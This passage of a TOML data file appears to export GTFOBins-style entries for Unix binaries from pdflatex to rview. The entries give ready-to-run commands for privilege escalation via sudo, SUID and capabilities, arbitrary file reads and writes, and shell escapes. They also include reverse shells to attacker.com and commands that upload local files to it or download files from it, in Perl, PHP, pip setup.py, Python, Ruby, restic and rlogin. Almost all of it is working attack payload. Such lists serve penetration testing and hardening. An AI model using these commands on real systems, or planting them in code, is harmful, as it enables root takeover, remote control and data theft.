  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
    [[privilege-esclation.exps.shell]]
      exp = "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
[[privilege-esclation]]
  Name = "pdftex"
  Description = ""
  Tags = ["shell", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"
    [[privilege-esclation.exps.shell]]
      exp = "pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"
[[privilege-esclation]]
  Name = "perf"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "perf stat /bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo perf stat /bin/sh\n"
    [[privilege-esclation.exps.suid]]
      exp = "./perf stat /bin/sh -p\n"
[[privilege-esclation]]
  Name = "perl"
  Description = ""
  Tags = ["suid", "sudo", "capabilities", "shell", "file-read", "reverse-shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.capabilities]]
      exp = "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nperl -ne print $LFILE\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nperl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n"
    [[privilege-esclation.exps.shell]]
      exp = "perl -e 'exec \"/bin/sh\";'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo perl -e 'exec \"/bin/sh\";'"
    [[privilege-esclation.exps.suid]]
      exp = "./perl -e 'exec \"/bin/sh\";'"
[[privilege-esclation]]
  Name = "perlbug"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"
[[privilege-esclation]]
  Name = "pexec"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "pexec /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo pexec /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./pexec /bin/sh -p"
[[privilege-esclation]]
  Name = "pg"
  Description = ""
  Tags = ["shell", "file-read", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "pg file_to_read"
    [[privilege-esclation.exps.shell]]
      exp = "pg /etc/profile\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo pg /etc/profile\n!/bin/sh\n"
    [[privilege-esclation.exps.suid]]
      exp = "./pg file_to_read"
[[privilege-esclation]]
  Name = "php"
  Description = ""
  Tags = ["file-read", "command", "reverse-shell", "file-download", "suid", "sudo", "capabilities", "shell", "file-upload", "file-write"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.capabilities]]
      exp = "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"
    [[privilege-esclation.exps.command]]
      exp = "export CMD=\"id\"\nphp -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(getenv(\"CMD\"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'\n"
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nphp -r '$c=file_get_contents(getenv(\"URL\"));file_put_contents(getenv(\"LFILE\"), $c);'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "export LFILE=file_to_read\nphp -r 'readfile(getenv(\"LFILE\"));'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "LHOST=0.0.0.0\nLPORT=8888\nphp -S $LHOST:$LPORT\n"
    [[privilege-esclation.exps.file-write]]
      exp = "export LFILE=file_to_write\nphp -r 'file_put_contents(getenv(\"LFILE\"), \"DATA\");'\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nphp -r '$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"
    [[privilege-esclation.exps.shell]]
      exp = "export CMD=\"/bin/sh\"\nphp -r 'system(getenv(\"CMD\"));'\n"
    [[privilege-esclation.exps.shell]]
      exp = "export CMD=\"/bin/sh\"\nphp -r 'passthru(getenv(\"CMD\"));'\n"
    [[privilege-esclation.exps.shell]]
      exp = "export CMD=\"/bin/sh\"\nphp -r 'print(shell_exec(getenv(\"CMD\")));'\n"
    [[privilege-esclation.exps.shell]]
      exp = "export CMD=\"/bin/sh\"\nphp -r '$r=array(); exec(getenv(\"CMD\"), $r); print(join(\"\\\\n\",$r));'\n"
    [[privilege-esclation.exps.shell]]
      exp = "export CMD=\"/bin/sh\"\nphp -r '$h=@popen(getenv(\"CMD\"),\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
[[privilege-esclation]]
  Name = "pic"
  Description = ""
  Tags = ["sudo", "limited-suid", "file-read", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\npic $LFILE\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./pic -U\n.PS\nsh X sh X\n"
    [[privilege-esclation.exps.shell]]
      exp = "pic -U\n.PS\nsh X sh X\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo pic -U\n.PS\nsh X sh X\n"
[[privilege-esclation]]
  Name = "pico"
  Description = ""
  Tags = ["sudo", "shell", "file-write", "file-read", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "pico file_to_read"
    [[privilege-esclation.exps.file-write]]
      exp = "pico file_to_write\nDATA\n^O\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./pico -s /bin/sh\n/bin/sh\n^T\n"
    [[privilege-esclation.exps.shell]]
      exp = "pico\n^R^X\nreset; sh 1>&0 2>&0\n"
    [[privilege-esclation.exps.shell]]
      exp = "pico -s /bin/sh\n/bin/sh\n^T\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n"
[[privilege-esclation]]
  Name = "pidstat"
  Description = ""
  Tags = ["suid", "command", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.command]]
      exp = "COMMAND=id\npidstat -e $COMMAND\n"
    [[privilege-esclation.exps.sudo]]
      exp = "COMMAND=id\nsudo pidstat -e $COMMAND\n"
    [[privilege-esclation.exps.suid]]
      exp = "COMMAND=id\n./pidstat -e $COMMAND\n"
[[privilege-esclation]]
  Name = "pip"
  Description = ""
  Tags = ["reverse-shell", "file-upload", "file-download", "file-write", "file-read", "library-load", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' > $TF/setup.py\npip install $TF\n"
    [[privilege-esclation.exps.file-read]]
      exp = "TF=$(mktemp -d)\necho 'raise Exception(open(\"file_to_read\").read())' > $TF/setup.py\npip install $TF\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\npip install $TF\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\npip install $TF\n"
    [[privilege-esclation.exps.file-write]]
      exp = "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"open('$LFILE','w+').write('DATA')\" > $TF/setup.py\npip install $TF\n"
    [[privilege-esclation.exps.library-load]]
      exp = "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\npip install $TF\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\npip install $TF\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\npip install $TF\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n"
[[privilege-esclation]]
  Name = "pkexec"
  Description = ""
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo pkexec /bin/sh"
[[privilege-esclation]]
  Name = "pkg"
  Description = ""
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo pkg install -y --no-repo-update ./x-1.0.txz\n"
[[privilege-esclation]]
  Name = "posh"
  Description = ""
  Tags = ["shell", "limited-suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./posh"
    [[privilege-esclation.exps.shell]]
      exp = "posh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo posh"
[[privilege-esclation]]
  Name = "pr"
  Description = "Some bytes are altered so it might not be suitable for binary files."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\npr -T $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\npr -T $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\npr -T $LFILE\n"
[[privilege-esclation]]
  Name = "pry"
  Description = ""
  Tags = ["sudo", "limited-suid", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./pry\nsystem(\"/bin/sh\")\n"
    [[privilege-esclation.exps.shell]]
      exp = "pry\nsystem(\"/bin/sh\")\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo pry\nsystem(\"/bin/sh\")\n"
[[privilege-esclation]]
  Name = "psftp"
  Description = ""
  Tags = ["shell", "limited-suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "sudo psftp\n!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "psftp\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo psftp\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "psql"
  Description = "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "psql\n\\?\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "psql\n\\?\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "ptx"
  Description = "While the program is capable of reading the file, it outputs a \"permuted index\" of its content, thus altering it. Adjusting the options could yield more readable outputs."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nptx -w 5000 \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo ptx -w 5000 \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./ptx -w 5000 \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "puppet"
  Description = ""
  Tags = ["shell", "file-write", "file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\npuppet filebucket -l diff /dev/null $LFILE\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=\"/tmp/file_to_write\"\npuppet apply -e \"file { '$LFILE': content => 'DATA' }\"\n"
    [[privilege-esclation.exps.shell]]
      exp = "puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"
[[privilege-esclation]]
  Name = "pwsh"
  Description = ""
  Tags = ["shell", "file-write", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-write]]
      exp = "export LFILE=file_to_write\npwsh -c '\"DATA\" | Out-File $env:LFILE'\n"
    [[privilege-esclation.exps.shell]]
      exp = "pwsh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo pwsh"
[[privilege-esclation]]
  Name = "python"
  Description = "The payloads are compatible with both Python version 2 and 3."
  Tags = ["file-upload", "suid", "capabilities", "library-load", "sudo", "shell", "reverse-shell", "file-download", "file-write", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.capabilities]]
      exp = "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "python -c 'print(open(\"file_to_read\").read())'"
    [[privilege-esclation.exps.file-upload]]
      exp = "export URL=http://attacker.com/\nexport LFILE=file_to_send\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export LPORT=8888\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "python -c 'open(\"file_to_write\",\"w+\").write(\"DATA\")'"
    [[privilege-esclation.exps.library-load]]
      exp = "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'\n"
    [[privilege-esclation.exps.shell]]
      exp = "python -c 'import os; os.system(\"/bin/sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo python -c 'import os; os.system(\"/bin/sh\")'"
    [[privilege-esclation.exps.suid]]
      exp = "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
[[privilege-esclation]]
  Name = "rake"
  Description = ""
  Tags = ["shell", "sudo", "limited-suid", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file-to-read\nrake -f $LFILE\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./rake -p '`/bin/sh 1>&0`'"
    [[privilege-esclation.exps.shell]]
      exp = "rake -p '`/bin/sh 1>&0`'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo rake -p '`/bin/sh 1>&0`'"
[[privilege-esclation]]
  Name = "rc"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "rc -c '/bin/sh'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo rc -c '/bin/sh'"
    [[privilege-esclation.exps.suid]]
      exp = "./rc -c '/bin/sh -p'"
[[privilege-esclation]]
  Name = "readelf"
  Description = "Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.\n"
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nreadelf -a @$LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo readelf -a @$LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./readelf -a @$LFILE\n"
[[privilege-esclation]]
  Name = "red"
  Description = "Read and write files limited to the current directory."
  Tags = ["file-write", "file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "red file_to_read\n,p\nq\n"
    [[privilege-esclation.exps.file-write]]
      exp = "red file_to_write\na\nDATA\n.\nw\nq\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo red file_to_write\na\nDATA\n.\nw\nq\n"
[[privilege-esclation]]
  Name = "redcarpet"
  Description = "The file is actually parsed as a Markdown file."
  Tags = ["file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nredcarpet \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "redis"
  Description = "This works with versions lower than 7."
  Tags = ["file-write"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-write]]
      exp = "IP=127.0.0.1\nredis-cli -h $IP\nconfig set dir dir_to_write_to\nconfig set dbfilename file_to_write\nset x \"DATA\"\nsave\n"
[[privilege-esclation]]
  Name = "restic"
  Description = "The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/) is used but there are other options. To start a new instance and create a new repository:\n\n```console\nRPORT=12345\nNAME=backup_name\n./rest-server --listen \":$RPORT\"\nrestic init -r \"rest:http://localhost:$RPORT/$NAME\"\n```\n\nTo extract the data from the restic repository in the current directory on the attacker side:\n\n```console\nrestic restore -r \"/tmp/restic/$NAME\" latest --target .\n```\n\nUpload data to the attacker server with the following commands.\n"
  Tags = ["file-upload", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nrestic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "rev"
  Description = ""
  Tags = ["suid", "sudo", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nrev $LFILE | rev\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo rev $LFILE | rev\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./rev $LFILE | rev\n"
[[privilege-esclation]]
  Name = "rlogin"
  Description = "Usually `rlogin` is a symlink to `ssh`, the following works only when the *real* `rlogin` is used (e.g., from the `rsh-client` APT package).\n"
  Tags = ["file-upload"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nrlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST\n"
[[privilege-esclation]]
  Name = "rlwrap"
  Description = ""
  Tags = ["shell", "file-write", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nrlwrap -l \"$LFILE\" echo DATA\n"
    [[privilege-esclation.exps.shell]]
      exp = "rlwrap /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo rlwrap /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./rlwrap -H /dev/null /bin/sh -p"
[[privilege-esclation]]
  Name = "rpm"
  Description = ""
  Tags = ["shell", "limited-suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
    [[privilege-esclation.exps.shell]]
      exp = "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
    [[privilege-esclation.exps.shell]]
      exp = "rpm --pipe '/bin/sh 0<&1'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo rpm -ivh x-1.0-1.noarch.rpm\n"
[[privilege-esclation]]
  Name = "rpmdb"
  Description = ""
  Tags = ["shell", "limited-suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./rpmdb --eval '%(/bin/sh 1>&2)'"
    [[privilege-esclation.exps.shell]]
      exp = "rpmdb --eval '%(/bin/sh 1>&2)'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo rpmdb --eval '%(/bin/sh 1>&2)'"
[[privilege-esclation]]
  Name = "rpmquery"
  Description = ""
  Tags = ["shell", "limited-suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'"
    [[privilege-esclation.exps.shell]]
      exp = "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
[[privilege-esclation]]
  Name = "rpmverify"
  Description = ""
  Tags = ["shell", "limited-suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./rpmverify --eval '%(/bin/sh 1>&2)'"
    [[privilege-esclation.exps.shell]]
      exp = "rpmverify --eval '%(/bin/sh 1>&2)'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo rpmverify --eval '%(/bin/sh 1>&2)'"
[[privilege-esclation]]
  Name = "rsync"
  Description = ""
  Tags = ["sudo", "suid", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
    [[privilege-esclation.exps.suid]]
      exp = "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
[[privilege-esclation]]
  Name = "rtorrent"
  Description = ""
  Tags = ["shell", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "echo \"execute = /bin/sh,-c,\\\"/bin/sh <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\nrtorrent\n"
    [[privilege-esclation.exps.suid]]
      exp = "echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\n./rtorrent\n"
[[privilege-esclation]]
  Name = "ruby"
  Description = ""
  Tags = ["shell", "reverse-shell", "file-download", "sudo", "capabilities", "file-upload", "file-write", "file-read", "library-load"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.capabilities]]
      exp = "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "ruby -e 'puts File.read(\"file_to_read\")'"
    [[privilege-esclation.exps.file-upload]]
      exp = "export LPORT=8888\nruby -run -e httpd . -p $LPORT\n"
    [[privilege-esclation.exps.file-write]]
      exp = "ruby -e 'File.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }'"
    [[privilege-esclation.exps.library-load]]
      exp = "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"lib.so\")'"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n"
    [[privilege-esclation.exps.shell]]
      exp = "ruby -e 'exec \"/bin/sh\"'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ruby -e 'exec \"/bin/sh\"'"
[[privilege-esclation]]
  Name = "run-mailcap"
  Description = ""
  Tags = ["shell", "file-read", "file-write", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "run-mailcap --action=view file_to_read"
    [[privilege-esclation.exps.file-write]]
      exp = "run-mailcap --action=edit file_to_read"
    [[privilege-esclation.exps.shell]]
      exp = "run-mailcap --action=view /etc/hosts\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "run-parts"
  Description = ""
  Tags = ["suid", "shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "run-parts --new-session --regex '^sh$' /bin"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo run-parts --new-session --regex '^sh$' /bin"
    [[privilege-esclation.exps.suid]]
      exp = "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
[[privilege-esclation]]
  Name = "rview"
  Description = ""
  Tags = ["non-interactive-reverse-shell", "non-interactive-bind-shell", "file-upload", "sudo", "capabilities", "shell", "file-download", "file-write", "file-read", "library-load", "suid", "limited-suid", "reverse-shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.capabilities]]
      exp = "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-download]]
      exp = "export LPORT=12345\nexport LFILE=file_to_save\nrview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "rview file_to_read"
